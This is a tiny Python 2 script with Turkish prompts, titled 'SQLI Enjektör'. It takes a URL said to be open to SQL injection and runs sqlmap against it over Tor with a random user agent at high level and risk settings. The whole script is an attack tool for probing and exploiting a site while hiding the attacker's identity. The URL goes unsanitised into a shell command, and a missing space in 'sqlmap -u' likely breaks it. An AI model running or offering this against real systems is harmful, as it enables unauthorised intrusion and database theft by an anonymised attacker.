#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import os 
import traceback

print "SQLI Enjektör"

target = raw_input('SQLI Açıklı URL: ')

cmd1 = os.system ('sqlmap -u' +target+' --tor --tor-type=SOCKS5 --check-tor --tor-port=9050 --random-agent --level=3 --risk=3 --threads=2')
